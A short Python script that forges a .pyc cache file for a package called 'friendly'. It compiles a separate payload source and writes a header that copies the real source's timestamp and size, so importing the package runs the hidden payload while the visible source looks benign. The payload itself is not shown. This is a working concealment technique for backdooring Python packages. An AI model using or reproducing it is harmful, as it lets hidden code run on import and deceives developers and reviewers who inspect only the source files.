"""Compile payload_source.py into friendly's __pycache__ with a forged
timestamp header, so the interpreter loads the payload bytecode on import
instead of recompiling the benign source."""

import importlib.util
import marshal
import os
import struct


def build_pyc(bytecode_source_path, header_source_path, out_path):
    code = compile(
        open(bytecode_source_path).read(), header_source_path, "exec"
    )
    st = os.stat(header_source_path)
    header = (
        importlib.util.MAGIC_NUMBER
        + struct.pack("<I", 0)  # flags: timestamp-based invalidation
        + struct.pack("<I", int(st.st_mtime) & 0xFFFFFFFF)
        + struct.pack("<I", st.st_size & 0xFFFFFFFF)
    )
    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    with open(out_path, "wb") as fh:
        fh.write(header + marshal.dumps(code))
    return out_path


def main():
    py = "friendly/__init__.py"
    return build_pyc("payload_source.py", py, importlib.util.cache_from_source(py))


if __name__ == "__main__":
    main()
